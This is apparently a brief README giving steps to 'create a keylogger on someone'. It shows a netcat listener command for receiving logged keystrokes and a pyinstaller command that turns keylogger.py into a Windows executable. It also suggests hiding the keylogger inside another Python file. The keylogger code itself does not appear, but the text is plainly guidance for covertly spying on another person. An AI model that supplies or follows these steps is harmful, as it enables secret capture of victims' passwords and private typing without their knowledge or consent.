# keyLogger

To create a keylogger on someone

create a netcat listener
```
nc -lnvp 4444
```
and depends on how you do it

either turn the keylogger python into a EXE file (for windows)

```
pyinstaller --onefile keylogger.py.
```

Or just embedd it in a python code file in a way which is hidden (well obviously)

